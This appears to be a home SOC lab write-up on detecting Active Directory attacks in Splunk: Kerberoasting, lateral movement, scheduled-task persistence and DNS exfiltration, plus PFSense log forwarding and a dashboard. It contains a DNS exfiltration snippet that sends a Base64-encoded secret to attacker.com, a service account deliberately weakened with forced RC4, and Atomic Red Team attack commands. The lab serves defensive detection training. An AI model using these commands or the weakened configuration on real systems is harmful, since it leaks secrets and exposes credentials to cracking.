# Week 3: Active Directory Attack Detection & Dashboard Building

**Date:** May 19 - June 2, 2026  
**Difficulty:** Beginner-Intermediate  
**Duration:** ~4 hours  

## What This Week Demonstrates
- Detected Kerberoasting by identifying RC4 encryption requests in Kerberos ticket logs
- Built correlated detection covering lateral movement, scheduled task persistence, and account escalation
- Configured PFSense firewall to forward logs to Splunk enabling network-layer detection alongside endpoint telemetry
- Detected DNS exfiltration using dual-source correlation between Sysmon and PFSense logs
- Built a 5-panel AD Health Monitor dashboard for operational visibility without manual querying

## Overview

Week 3 focuses on **AD-specific attacks** and introduces **network-layer detection**. We create a Kerberoastable service account, detect Kerberoasting attempts, lateral movement, and build the first multi-panel Splunk dashboard. Additionally, we configure PFSense to forward firewall logs to Splunk, enabling network-level threat detection.

**Key Outcome:** Detect Kerberoasting (EventCode 4769 + RC4), lateral movement (EventCode 4624 Logon_Type=3), scheduled task persistence (EventCode 4698), and correlate DNS queries + network traffic for exfiltration detection.

## Active Directory Attacks Detected

| Attack | EventCode | Indicator | Detection |
|---|---|---|---|
| **Kerberoasting** | 4769 | Ticket_Encryption_Type=0x17 (RC4) | Count RC4 tickets per service account |
| **Lateral Movement** | 4624 | Logon_Type=3 from unusual source | Track Type 3 logons to identify movement |
| **Scheduled Task Persistence** | 4698 | Task_Name in Security log | Alert on new scheduled tasks |
| **Account Creation** | 4720/4732 | New account + Admin group | Correlate creation and escalation |

## Tasks Completed

### Task 1: Create Kerberoastable Service Account

**Setup:**
```powershell
# Create svc_sql service account
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true

# Set Service Principal Name (required for Kerberoasting)
setspn -a MSSQLSvc/DC-01.lab.local:1433 lab\svc_sql

# Force RC4 encryption (vulnerable to offline cracking)
Set-ADUser svc_sql -add @{'msDS-SupportedEncryptionTypes'=4}

# Verify SPN set
setspn -l lab\svc_sql
```

**Why RC4?** RC4 encryption can be cracked offline; AES is not.

### Task 2: Simulate and Detect Kerberoasting

**Attack:**
```powershell
Invoke-AtomicTest T1558.003 -TestNumbers 5 -PromptForInputArgs
# Targets: MSSQLSvc/DC-01.lab.local:1433
```

**Detection Query:**
```spl
index=windows EventCode=4769 Ticket_Encryption_Type=0x17 
| table _time, host, Account_Name, Service_Name, Ticket_Encryption_Type 
| sort -_time
```

**Result:** ✅ Detected RC4 ticket request (0x17) for svc_sql service account

**Detection Evidence:**

![Kerberoasting Detection - RC4 Tickets](./screenshots/week3-01-kerberoasting-rc4.png)
*Splunk EventCode 4769 showing Ticket_Encryption_Type=0x17 (RC4) requested for svc_sql service account - cryptographically weak and crackable offline*

![Alert Triggered on RC4 Detection](./screenshots/week3-02-kerberoasting-alert.png)
*Alert notification firing when Kerberoasting attack (RC4 ticket request) detected*

### Task 3: Detect Lateral Movement (EventCode 4624 Type 3)

**What is Logon_Type=3?**
- Type 3 = Network logon (SMB, RDP over network)
- Legitimate: Users accessing network shares, admins RDPing to servers
- Suspicious: Service accounts doing network logons, unusual source IPs

**Detection Query:**
```spl
index=windows EventCode=4624 Logon_Type=3 
| eval user=mvindex(Account_Name,1) 
| table _time, host, user, Logon_Type, Source_Network_Address, Workstation_Name 
| sort -_time
```

**Baseline:** Filtered known admin accounts and expected service accounts to reduce noise.

**Result:** ✅ Can track lateral movement chains (machine A → machine B → machine C)

**Lateral Movement Detection:**

![Type 3 Network Logons - Lateral Movement](./screenshots/week3-03-lateral-movement-type3.png)
*Splunk showing EventCode 4624 Logon_Type=3 (network logons) with source IP and destination machine - clear lateral movement pattern across infrastructure*

### Task 4: Enable and Detect Scheduled Task Persistence

**Problem:** EventCode 4698 wasn't appearing (audit policy gap)

**Fix:**
```powershell
# On DC01, enable via GPO
# Computer Configuration → Policies → Windows Settings → Security Settings → 
# Advanced Audit Policy Configuration → Audit Policies → Object Access → 
# Audit Other Object Access Events (Success + Failure)
gpupdate /force
```

**Simulation:**
```powershell
Invoke-AtomicTest T1053.005-2
# Creates task named "spawn" that runs malicious command
```

**Detection Query:**
```spl
index=windows EventCode=4698 
| table _time, host, Account_Name, Task_Name 
| sort -_time
```

**Result:** ✅ Detected new scheduled task creation by attacker account

**Scheduled Task Detection:**

![EventCode 4698 - Scheduled Task Created](./screenshots/week3-04-eventcode-4698-task.png)
*Splunk EventCode 4698 showing "spawn" scheduled task created by attacker account with full task path and properties*

![Task Scheduler - Malicious Task Properties](./screenshots/week3-05-task-scheduler-spawn.png)
*Windows Task Scheduler showing "spawn" malicious task scheduled to run at regular intervals*

### Task 5: Configure PFSense → Splunk Syslog Pipeline

**Objective:** Send firewall logs from PFSense to Splunk for network-layer detection

**Steps:**
1. Enabled syslog on PFSense: Status → System Logs → Settings
2. Changed log format to BSD (RFC 3164) for compatibility
3. Set syslog destination: Splunk (10.10.20.3:5014)
4. Created UDP input on Splunk listening on port 5014
5. Set sourcetype to `pfsense`

**Challenge:** TA-pfsense add-on didn't parse filterlog format correctly

**Solution:** Created custom field extraction `REPORT-pfsense_filterlog_fields` extracting:
- interface, reason, action, direction, ip_version, protocol, src_ip, dst_ip, src_port, dst_port

**Result:** ✅ PFSense logs now flowing into `index=pfsense` with parsed fields

**PFSense → Splunk Configuration:**

![PFSense Syslog Configuration](./screenshots/week3-06-pfsense-syslog-settings.png)
*PFSense Status → System Logs → Settings showing syslog enabled, BSD format selected, destination set to Splunk 10.10.20.3:5014*

![Splunk UDP Input - PFSense Sourcetype](./screenshots/week3-07-splunk-udp-pfsense.png)
*Splunk Data Inputs → UDP showing port 5014 listening with sourcetype=pfsense*

### Task 6: Simulate and Detect DNS Exfiltration

**Attack Technique (T1048.003):**
- Encode secret data in DNS subdomain labels
- Attacker controls DNS server; can extract data from query itself
- Firewall might block outbound traffic but allows DNS queries

**Simulation:**
```powershell
# Encode secret message in Base64 and create DNS query
$secret = "AdminPassword123="
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($secret))
Resolve-DnsName "$encoded.attacker.com" -ErrorAction SilentlyContinue
```

**Dual-Source Correlation:**

**Source 1: Sysmon (Endpoint)**
```spl
index=windows EventCode=22 QueryName="*.attacker.com"
| where QueryResults="-" 
| eval subdomain_length=len(QueryName) 
| where subdomain_length > 30
| table _time, host, QueryName, subdomain_length
```

**Source 2: PFSense (Network)**
```spl
index=pfsense dst_port=53 dst_ip="attacker_ns_ip"
| stats count by src_ip, dst_ip, action
```

**Result:** ✅ Detected Base64-encoded subdomain + NXDOMAIN response pattern (data already exfiltrated in query)

**Dual-Source Exfiltration Detection:**

![Sysmon EventCode 22 - Base64 DNS Query](./screenshots/week3-08-sysmon-ec22-base64-dns.png)
*Sysmon EventCode 22 showing Base64-encoded subdomain being queried (e.g., "QWRtaW5QYXNzd29yZDEyMw==.attacker.com") with NXDOMAIN response*

![PFSense Firewall Log - DNS Exfiltration Traffic](./screenshots/week3-09-pfsense-dns-exfil-traffic.png)
*PFSense filterlog showing DNS traffic (port 53) from internal machine to attacker nameserver - network-layer evidence of exfiltration*

![Decoded Secret Message](./screenshots/week3-10-decoded-secret-message.png)
*Base64-decoded exfiltrated content revealing secret message extracted from DNS subdomain queries*

### Task 7: Build AD Health Monitor Dashboard

**5-Panel Dashboard:**

1. **Failed Logons Over Time** (EventCode 4625 trend)
2. **Network Logons / Lateral Movement** (EventCode 4624 Type=3)
3. **New Accounts Created** (EventCode 4720)
4. **Kerberoasting Attempts** (EventCode 4769 with RC4)
5. **Scheduled Tasks Created** (EventCode 4698)

**Dashboard Layout:** Single-row panels, color-coded by threat level

**Result:** ✅ Operations team can see AD health at a glance; anomalies immediately visible

**Dashboard Implementation:**

![AD Health Monitor Dashboard - All 5 Panels](./screenshots/week3-11-ad-health-dashboard.png)
*Splunk AD Health Monitor dashboard showing all 5 panels: Failed Logons trend, Network Logons/Lateral Movement, New Accounts, Kerberoasting Attempts, Scheduled Tasks*

![Kerberoasting Detection Spike - Single Panel](./screenshots/week3-12-kerberoasting-panel-spike.png)
*Individual dashboard panel zoomed in showing clear spike in Kerberoasting attempts (RC4 tickets) detected during attack simulation*

## Deferred Task: LSASS Credential Dumping (T1003.001)

**Problem:** Attempted to detect LSASS dump (comsvcs.dll method) but got no Sysmon telemetry

**Root Cause:** EventCode 10 (Process Access) not configured in Sysmon

**Decision:** Defer to Week 6 when we revisit Sysmon advanced configuration

## Key Learnings

- **Encryption type matters:** RC4 (0x17) vs AES (0x12) reveals attack technique
- **Logon_Type is critical:** Type 3 = network access; baseline first to find anomalies
- **Audit policies have gaps:** EventCode 4698 required specific GPO setting
- **Network + endpoint correlation is powerful:** DNS exfiltration needs both Sysmon + firewall logs
- **Dashboards provide operational visibility:** Analysts don't need to write queries every time

## Splunk Queries Built

| Detection | Confidence |
|---|---|
| Kerberoasting (RC4 tickets) | Very High |
| Lateral Movement (Type 3 logons) | High |
| Scheduled Task Persistence | Very High |
| DNS Exfiltration (Base64 + NXDOMAIN) | High |

**Week 3 Status:** ✅ COMPLETE (T1003.001 deferred to Week 6)  

## Navigation

← [Back to Main SOC Lab Overview](../Readme.md)  
[Week 4: Linux Syslog →](./week4-linux-syslog.md)